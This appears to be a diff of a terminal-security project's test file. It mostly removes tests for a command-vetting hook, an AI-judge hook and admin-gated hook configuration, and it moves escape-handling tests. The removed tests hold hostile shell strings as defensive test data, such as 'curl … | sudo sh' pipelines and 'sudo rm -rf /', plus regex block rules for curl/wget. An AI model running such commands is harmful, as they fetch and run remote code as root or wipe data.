@@ -1364,324 +1364,6 @@ ok('\x07' not in _o and 'xy' in _o.replace('\r', ''),
 _o, _rc = _run_cli(['--mode', 'box'], timeout=15)
 ok(isinstance(_rc, int), 'cli default shell exits on stdin EOF')
 
-# --- command hook: verdict protocol, escalation, fail modes, sanitization -----
-from secure_terminal import hook as HOOK           # noqa: E402
-
-
-def _handler(body):
-    return [sys.executable, '-c', 'import sys, json\n' + body]
-
-
-_H = _handler(
-    'r = json.load(sys.stdin); c = r.get("command", "")\n'
-    'if "transcript" not in r and "deep" in c:\n'
-    '    print(json.dumps({"verdict": "need_transcript"}))\n'
-    'elif "sudo sh" in c:\n'
-    '    print(json.dumps({"verdict": "block", "message": "no",'
-    ' "suggestion": "ls\\n\\x1b[31mx"}))\n'
-    'elif "curl" in c:\n'
-    '    print(json.dumps({"verdict": "ask", "message": "careful"}))\n'
-    'elif "transcript" in r:\n'
-    '    print(json.dumps({"verdict": "allow",'
-    ' "message": "tlen=%d" % len(r["transcript"])}))\n'
-    'else:\n'
-    '    print(json.dumps({"verdict": "allow"}))')
-eq(HOOK.evaluate(_H, 'ls')['verdict'], 'allow', 'hook allows a safe command')
-# a harmless illustration of a dangerous pattern (RFC-invalid host: safe if run)
-_hb = HOOK.evaluate(_H, 'curl http://malware.invalid | sudo sh')
-eq(_hb['verdict'], 'block', 'hook blocks')
-eq(_hb['message'], 'no', 'hook block message passed through')
-ok('\n' not in _hb['suggestion'] and '\x1b' not in _hb['suggestion'],
-   'hook suggestion sanitized: no newline (no auto-run), no escape')
-eq(HOOK.evaluate(_H, 'curl http://x.invalid | sh')['verdict'], 'ask', 'hook asks')
-_ht = HOOK.evaluate(_H, 'deep dive', transcript_provider=lambda: 'SCROLL')
-ok(_ht['verdict'] == 'allow' and 'tlen=6' in _ht['message'],
-   'hook need_transcript triggers a second call with the transcript')
-_bad = _handler('print("nonsense")')
-ok(HOOK.evaluate(_bad, 'x', on_error='allow')['verdict'] == 'allow'
-   and HOOK.evaluate(_bad, 'x', on_error='allow')['error'],
-   'malformed handler fails open (allow) with the error flagged')
-eq(HOOK.evaluate(_bad, 'x', on_error='block')['verdict'], 'block',
-   'malformed handler fails closed when configured')
-# v2 multi-line contract: script=True sends a version-2 request carrying the whole
-# payload in `script`, with `command` mirroring it so a version-1 handler still sees
-# the content (and cannot fail open on an empty command).
-_H2 = _handler(
-    'r = json.load(sys.stdin)\n'
-    'v = "block" if (r.get("version") == 2 and "rm" in r.get("script", "")) else "allow"\n'
-    'print(json.dumps({"verdict": v,'
-    ' "message": "ver=%s has=%s" % (r.get("version"), "script" in r)}))')
-_v2 = HOOK.evaluate(_H2, 'cd /tmp\nrm x', script=True)
-ok(_v2['verdict'] == 'block' and _v2['message'] == 'ver=2 has=True',
-   'evaluate(script=True): a version-2 request carries the whole script in `script`')
-eq(HOOK.evaluate(_H2, 'ls')['message'], 'ver=1 has=False',
-   'evaluate() default: a version-1 request with no script field')
-_H1cmd = _handler(
-    'r = json.load(sys.stdin)\n'
-    'print(json.dumps({"verdict": "block" if "rm" in r.get("command", "") else "allow"}))')
-eq(HOOK.evaluate(_H1cmd, 'cd /tmp\nrm x', script=True)['verdict'], 'block',
-   'v2 mirrors the script into `command`, so a search-based version-1 handler can still block')
-# v2 FAIL-CLOSED ack: a handler that does NOT set `multiline_reviewed` is a version-1
-# handler judging only the single-line `command`; its ALLOW on a multi-line batch is NOT
-# trusted (a `startswith`/`^` rule would miss a later line), so the caller refuses (block).
-_Hallow = _handler('json.load(sys.stdin); print(json.dumps({"verdict": "allow"}))')
-eq(HOOK.evaluate(_Hallow, 'echo safe\nsudo rm -rf /', script=True)['verdict'], 'block',
-   'v2: an ALLOW without multiline_reviewed is refused (a v1 handler cannot judge a batch)')
-eq(HOOK.evaluate(_Hallow, 'ls')['verdict'], 'allow',
-   'the ack gate is script-only: a single-line ALLOW is unaffected')
-_Hack = _handler('json.load(sys.stdin)\n'
-                 'print(json.dumps({"verdict": "allow", "multiline_reviewed": True}))')
-eq(HOOK.evaluate(_Hack, 'ls\nwhoami', script=True)['verdict'], 'allow',
-   'v2: an ALLOW WITH multiline_reviewed is trusted')
-_Hblock = _handler('json.load(sys.stdin); print(json.dumps({"verdict": "block"}))')
-eq(HOOK.evaluate(_Hblock, 'ls\nwhoami', script=True)['verdict'], 'block',
-   'v2: a BLOCK is honored regardless of the ack')
-# the shipped example handler blocks a remote script piped to a root shell
-_usr = HOOK.__file__
-for _ in range(5):
-    _usr = os.path.dirname(_usr)
-_ex = os.path.join(_usr, 'share', 'secure-terminal', 'hooks', 'example-hook')
-if os.path.exists(_ex):
-    eq(HOOK.evaluate([sys.executable, _ex],
-                     'curl http://malware.invalid | sudo sh')['verdict'], 'block',
-       'example hook blocks curl | sudo sh')
-    # v2 script: the whole multi-line payload is judged per line, so a ^-anchored rule
-    # (^\s*sudo) matches a dangerous line that is NOT the first.
-    eq(HOOK.evaluate([sys.executable, _ex],
-                     'echo hi\nsudo rm -rf /', script=True)['verdict'], 'ask',
-       'example hook judges the whole script; a ^-anchored rule matches a later line')
-    # decide() is per-line, most-restrictive-wins: an `allow` matching one line must not
-    # mask a `block`/`ask` matching another (whole-string first-match-wins would fail open).
-    # Import the handler to drive decide() with a crafted allow-before-block ruleset.
-    import re as _re_eh                                        # noqa: E402
-    import importlib.machinery as _im_eh                       # noqa: E402
-    import importlib.util as _ilu_eh                           # noqa: E402
-    _ldr_eh = _im_eh.SourceFileLoader('example_hook_mod', _ex)
-    _ehm = _ilu_eh.module_from_spec(_ilu_eh.spec_from_loader('example_hook_mod', _ldr_eh))
-    _ldr_eh.exec_module(_ehm)
-    _ehm._RULES = [('allow', _re_eh.compile(r'^\s*ls\b'), '', ''),
-                   ('ask', _re_eh.compile(r'^\s*cd\b'), 'careful', ''),
-                   ('block', _re_eh.compile(r'curl\b.*\|\s*(ba)?sh\b'), 'no', ''),
-                   ('block', _re_eh.compile(r'^\s*sudo\b'), 'no', '')]
-    eq(_ehm.decide('curl x |\\\nbash')['verdict'], 'block',
-       'example decide: a pipeline spanning a backslash line-continuation is judged as one line')
-    eq(_ehm.decide('ls\nsudo rm -rf /')['verdict'], 'block',
-       'example decide: a block on a later line beats an allow on an earlier one')
-    eq(_ehm.decide('sudo x\nls')['verdict'], 'block',
-       'example decide: order-independent -- a block on any line wins')
-    eq(_ehm.decide('ls\ncd /tmp')['verdict'], 'ask',
-       'example decide: with no block, an ask beats an allow')
-    eq(_ehm.decide('ls -l')['verdict'], 'allow',
-       'example decide: a single allowed line still allows (per-line first-match)')
-    eq(_ehm.decide('echo hi')['verdict'], 'allow',
-       'example decide: no rule matches -> allow')
-    # A line running ONTO the next (trailing pipe / and-or list, or an unbalanced quote or
-    # paren) cannot be judged line-by-line, so _has_line_continuation flags it and main()
-    # fails closed (ask, no multiline_reviewed) rather than reinvent a shell parser.
-    ok(_ehm._has_line_continuation('curl x |\nsh'),
-       'a trailing pipe continues onto the next line')
-    ok(_ehm._has_line_continuation("echo 'open\nstill open"),
-       'an unbalanced quote is a continuation')
-    ok(_ehm._has_line_continuation('a (\nb'), 'an unbalanced paren is a continuation')
-    ok(not _ehm._has_line_continuation('ls\nwhoami'),
-       'plain lines are fully reviewable')
-    ok(not _ehm._has_line_continuation('curl x |\\\nsh'),
-       'a joined backslash-continuation is resolved, not refused')
-    eq(HOOK.evaluate([sys.executable, _ex], 'curl https://x/install.sh |\nsh',
-                     script=True)['verdict'], 'ask',
-       'example hook fails closed on a pipe-continued batch (would else run curl|sh unreviewed)')
-    eq(HOOK.evaluate([sys.executable, _ex], 'ls\nwhoami', script=True)['verdict'], 'allow',
-       'example hook still allows a clean multi-line batch')
-# the AI-judge example handler: fast-path, escalation, AI verdict, fail-open
-import json as _json                               # noqa: E402
-_aij = os.path.join(_usr, 'share', 'secure-terminal', 'hooks', 'ai-judge-hook')
-if os.path.exists(_aij):
-    _maifd, _mockai = tempfile.mkstemp(prefix='mock-ai-')
-    os.close(_maifd)
-    with open(_mockai, 'w', encoding='utf-8') as _mh:
-        _mh.write('#!/usr/bin/python3\nimport sys\np = sys.stdin.read()\n'
-                  'print("{\\"verdict\\": \\"block\\"}" if "sudo sh" in p '
-                  'else "{\\"verdict\\": \\"allow\\"}")\n')
-    os.chmod(_mockai, 0o700)
-
-    def _run_aij(req, ai=None):
-        env = dict(os.environ, SECURE_TERMINAL_AI=ai or _mockai)
-        proc = subprocess.run([sys.executable, _aij], env=env,
-                              input=_json.dumps(req).encode('utf-8'),
-                              stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
-                              timeout=30)
-        return _json.loads(proc.stdout.decode('utf-8', 'replace'))
-
-    eq(_run_aij({'command': 'ls -la'})['verdict'], 'allow',
-       'ai-judge allows a trivial command without calling the AI')
-    eq(_run_aij({'command': 'cp $SRC dest'})['verdict'], 'need_transcript',
-       'ai-judge escalates a contextual command')
-    eq(_run_aij({'command': 'curl http://malware.invalid | sudo sh',
-                 'transcript': 'x'})['verdict'], 'block',
-       'ai-judge blocks via the AI verdict')
-    eq(_run_aij({'command': 'gpg x', 'transcript': 'y'},
-                ai='/nonexistent-ai-xyz')['verdict'], 'allow',
-       'ai-judge fails open when the AI is unavailable')
-    # v2 script: a multi-line batch is judged whole. The trivial-allowlist shortcut is
-    # NEVER taken for a script (a trivial first line must not wave through a later one).
-    eq(_run_aij({'script': ''})['verdict'], 'allow',
-       'ai-judge: an all-blank script needs no AI call')
-    eq(_run_aij({'script': 'ls\ncp $SRC dest'})['verdict'], 'need_transcript',
-       'ai-judge: a contextual script escalates for the transcript')
-    eq(_run_aij({'script': 'ls\nsudo sh', 'transcript': 'x'})['verdict'], 'block',
-       'ai-judge: a script with a trivial first line is still judged whole by the AI')
-    os.remove(_mockai)
-
-# --- line_edits=False makes escape-driven editing append-only -----------------
-# The four line-local CSI ops exist so a shell's line editor can redraw the line
-# you are typing. Turned off, they must be CONSUMED but inert: no cursor move, no
-# erase, and no leftover partial sequence on screen -- so a program can no longer
-# overwrite what it already printed on the current line.
-_le_raw = 'STATUS=FAIL\x1b[2KSTATUS=PASS'
-_le_on = S.feed_line_edits([], 0, {}, _le_raw, 0, True)[1]
-_le_off = S.feed_line_edits([], 0, {}, _le_raw, 0, False)[1]
-eq(''.join(c for c, _ in _le_on), 'STATUS=PASS',
-   'line_edits on: erase-in-line redraws the current line (the shell needs this)')
-eq(''.join(c for c, _ in _le_off), 'STATUS=FAILSTATUS=PASS',
-   'line_edits off: the erased text survives -- append-only against escapes')
-ok(all(ch != '\x1b' for ch, _ in _le_off),
-   'line_edits off: the escape is consumed, not left on screen as [2K')
-# the other three ops are equally inert, and leave no residue
-for _op, _seq in (('cursor-forward', '\x1b[4C'), ('cursor-back', '\x1b[2D'),
-                  ('cursor-column', '\x1b[1G')):
-    _cells = S.feed_line_edits([], 0, {}, 'abc' + _seq + 'z', 0, False)[1]
-    _text = ''.join(c for c, _ in _cells)
-    eq(_text, 'abcz', 'line_edits off: %s is inert and leaves no residue' % _op)
-# \r and \b are raw control bytes, NOT escapes: still honored either way, which
-# is why this is append-only against escapes rather than against every byte.
-_cr_off = S.feed_line_edits([], 0, {}, 'FAIL\rPASS', 0, False)[1]
-eq(''.join(c for c, _ in _cr_off), 'PASS',
-   'line_edits off: carriage return still overwrites (a raw byte, not an escape)')
-# the default is on, so an omitted argument keeps today's behaviour
-eq(S.feed_line_edits([], 0, {}, _le_raw)[1], _le_on,
-   'line_edits defaults to on (omitting it changes nothing)')
-
-# --- hooklib: tiered, admin-gated hook configuration --------------------------
-import importlib.util as _ilu                       # noqa: E402
-_hlpath = os.path.join(_usr, 'share', 'secure-terminal', 'hooks', 'hooklib.py')
-# hooklib gates whether a USER may weaken the command-hook judge, so its absence
-# is a FAIL, not a skip: silently not testing a privilege boundary reads as a pass.
-ok(os.path.exists(_hlpath), 'hooklib present at %s' % _hlpath)
-if os.path.exists(_hlpath):
-    _spec = _ilu.spec_from_file_location('hooklib', _hlpath)
-    _hl = _ilu.module_from_spec(_spec)
-    _spec.loader.exec_module(_hl)
-    _priv = tempfile.mkdtemp()
-    _pd = os.path.join(_priv, 'secure-terminal.d')
-    os.makedirs(_pd)
-    _homebase = tempfile.mkdtemp()
-    _hd = os.path.join(_homebase, 'secure-terminal.d')
-    os.makedirs(_hd)
-    _hl._PRIVILEGED = (_priv,)
-    _saved_xdg = os.environ.get('XDG_CONFIG_HOME')
-    os.environ['XDG_CONFIG_HOME'] = _homebase
-    try:
-        # rules parse: fields split on ' | '; a regex ALTERNATION (curl|wget),
-        # whose pipe has no surrounding spaces, must NOT be split (regression).
-        with open(os.path.join(_pd, 'example-hook-rules.conf'), 'w') as _f:
-            _f.write('block | \\b(curl|wget)\\b | piped\n'
-                     '# a comment\nbadline\n'
-                     'ask | ^sudo | root\n')
-        eq(_hl.read_rules('example-hook-rules.conf'),
-           [('block', '\\b(curl|wget)\\b', 'piped', ''), ('ask', '^sudo', 'root', '')],
-           'hooklib: rules parsed; regex alternation not split; comments skipped')
-        # the gate: the home tier is IGNORED by default
-        with open(os.path.join(_hd, 'ai-judge-prompt.txt'), 'w') as _f:
-            _f.write('USER PROMPT')
-        ok(not _hl.allow_user_config(), 'hooklib: user hook config off by default')
-        eq(_hl.read_file('ai-judge-prompt.txt'), None,
-           'hooklib: home tier ignored unless an admin allows it')
-        # an admin enables it in a PRIVILEGED tier -> the home file is now honored
-        with open(os.path.join(_pd, 'hooks.conf'), 'w') as _f:
-            _f.write('hook_config_allow_user=true\n')
-        ok(_hl.allow_user_config(), 'hooklib: an admin can allow user hook config')
-        eq(_hl.read_file('ai-judge-prompt.txt'), 'USER PROMPT',
-           'hooklib: home tier honored once allowed')
-        # a home config CANNOT flip the gate (it is read from privileged only)
-        with open(os.path.join(_hd, 'hooks.conf'), 'w') as _f:
-            _f.write('hook_config_allow_user=false\n')
-        ok(_hl.allow_user_config(), 'hooklib: home cannot turn its own gate off')
-
-        # --- rules parsing, every branch --------------------------------------
-        eq(_hl.read_rules('no-such-rules.conf'), None,
-           'hooklib: absent rules file -> None, so the caller keeps its default')
-        with open(os.path.join(_pd, 'shapes.conf'), 'w') as _f:
-            _f.write('\n'                       # blank line -> skipped
-                     '   \n'                    # whitespace-only -> skipped
-                     '# comment | block | x\n'  # comment -> skipped, even if piped
-                     'block\n'                  # one field -> skipped
-                     'nope | ^x | m\n'          # bad verdict -> skipped
-                     'allow | ^ls\n'            # 2 fields -> empty msg+suggestion
-                     'block | ^rm | destructive\n'          # 3 fields
-                     'ask | ^dd | risky | use cp\n'         # 4 fields
-                     'allow | ^a | m | s | extra\n')        # 5 -> extra ignored
-        eq(_hl.read_rules('shapes.conf'),
-           [('allow', '^ls', '', ''),
-            ('block', '^rm', 'destructive', ''),
-            ('ask', '^dd', 'risky', 'use cp'),
-            ('allow', '^a', 'm', 's')],
-           'hooklib: rules honor 2/3/4 fields and drop blank/comment/short/bad-verdict')
-
-        # --- privileged conf parsing, every branch ----------------------------
-        # highest privileged tier wins; comments and non-KEY=value lines ignored.
-        _priv2 = tempfile.mkdtemp()
-        _pd2 = os.path.join(_priv2, 'secure-terminal.d')
-        os.makedirs(_pd2)
-        with open(os.path.join(_pd2, 'hooks.conf'), 'w') as _f:
-            _f.write('# comment=true\n'
-                     'no-equals-here\n'
-                     'other_key=value\n'
-                     'hook_config_allow_user=false\n')
-        _hl._PRIVILEGED = (_priv, _priv2)       # _priv2 is the higher tier
-        ok(not _hl.allow_user_config(),
-           'hooklib: the highest privileged tier wins the gate')
-        _hl._PRIVILEGED = (_priv2, _priv)       # reverse the order
-        ok(_hl.allow_user_config(),
-           'hooklib: tier precedence follows the configured order, last wins')
-        eq(_hl._privileged_conf_value('absent_key'), None,
-           'hooklib: an unset key reads as None')
-
-        # a file the highest tier does not have falls back to the lower tier
-        with open(os.path.join(_pd, 'ai-judge-prompt.txt'), 'w') as _f:
-            _f.write('ADMIN PROMPT')
-        _hl._PRIVILEGED = (_priv, _priv2)
-        eq(_hl.read_file('ai-judge-prompt.txt'), 'ADMIN PROMPT',
-           'hooklib: a tier without the file does not blank a lower tier that has it')
-        eq(_hl.read_file('nothing-anywhere.txt'), None,
-           'hooklib: a file absent from every tier reads as None')
-
-        # --- the home tier with XDG_CONFIG_HOME UNSET -------------------------
-        # _tiers() falls back to ~/.config; point HOME at a temp dir so the real
-        # user config is neither read nor written.
-        _fakehome = tempfile.mkdtemp()
-        os.makedirs(os.path.join(_fakehome, '.config', 'secure-terminal.d'))
-        with open(os.path.join(_fakehome, '.config', 'secure-terminal.d',
-                               'ai-judge-prompt.txt'), 'w') as _f:
-            _f.write('HOME FALLBACK')
-        _saved_home = os.environ.get('HOME')
-        os.environ.pop('XDG_CONFIG_HOME', None)
-        os.environ['HOME'] = _fakehome
-        try:
-            _hl._PRIVILEGED = (_priv,)          # this tier has allow_user=true
-            eq(_hl.read_file('ai-judge-prompt.txt'), 'HOME FALLBACK',
-               'hooklib: without XDG_CONFIG_HOME the home tier falls back to ~/.config')
-        finally:
-            if _saved_home is None:
-                os.environ.pop('HOME', None)
-            else:
-                os.environ['HOME'] = _saved_home
-            os.environ['XDG_CONFIG_HOME'] = _homebase
-    finally:
-        if _saved_xdg is None:
-            os.environ.pop('XDG_CONFIG_HOME', None)
-        else:
-            os.environ['XDG_CONFIG_HOME'] = _saved_xdg
-
 # --- feed_line_edits: the line-mode logical-cell editor -----------------------
 def _line(raw, mode='box', prev=None, col=0, sgr=None):
     """Feed raw into a fresh (or given) line buffer; return (completed_display,
@@ -1732,6 +1414,36 @@ def _cells_render(raw, mode='detail', line_edits=True, max_line=0):
         [], 0, {}, raw, max_line, line_edits)
     runs, _prefix = S.cells_to_runs(comp, cells, mode, False, wraps=wraps)
     return ''.join(text for text, _key in runs)
+
+
+# --- line_edits=False makes escape-driven editing append-only -----------------
+# The four line-local CSI ops exist so a shell's line editor can redraw the line
+# you are typing. Turned off, they must be CONSUMED but inert: no cursor move, no
+# erase, and no leftover partial sequence on screen -- so a program can no longer
+# overwrite what it already printed on the current line.
+_le_raw = 'STATUS=FAIL\x1b[2KSTATUS=PASS'
+_le_on = S.feed_line_edits([], 0, {}, _le_raw, 0, True)[1]
+_le_off = S.feed_line_edits([], 0, {}, _le_raw, 0, False)[1]
+eq(''.join(c for c, _ in _le_on), 'STATUS=PASS',
+   'line_edits on: erase-in-line redraws the current line (the shell needs this)')
+eq(''.join(c for c, _ in _le_off), 'STATUS=FAILSTATUS=PASS',
+   'line_edits off: the erased text survives -- append-only against escapes')
+ok(all(ch != '\x1b' for ch, _ in _le_off),
+   'line_edits off: the escape is consumed, not left on screen as [2K')
+# the other three ops are equally inert, and leave no residue
+for _op, _seq in (('cursor-forward', '\x1b[4C'), ('cursor-back', '\x1b[2D'),
+                  ('cursor-column', '\x1b[1G')):
+    _cells = S.feed_line_edits([], 0, {}, 'abc' + _seq + 'z', 0, False)[1]
+    _text = ''.join(c for c, _ in _cells)
+    eq(_text, 'abcz', 'line_edits off: %s is inert and leaves no residue' % _op)
+# \r and \b are raw control bytes, NOT escapes: still honored either way, which
+# is why this is append-only against escapes rather than against every byte.
+_cr_off = S.feed_line_edits([], 0, {}, 'FAIL\rPASS', 0, False)[1]
+eq(''.join(c for c, _ in _cr_off), 'PASS',
+   'line_edits off: carriage return still overwrites (a raw byte, not an escape)')
+# the default is on, so an omitted argument keeps today's behaviour
+eq(S.feed_line_edits([], 0, {}, _le_raw)[1], _le_on,
+   'line_edits defaults to on (omitting it changes nothing)')
 
 
 # --- BYPASS: the ECMA-48 escape grammar, not just the arms we remembered -------
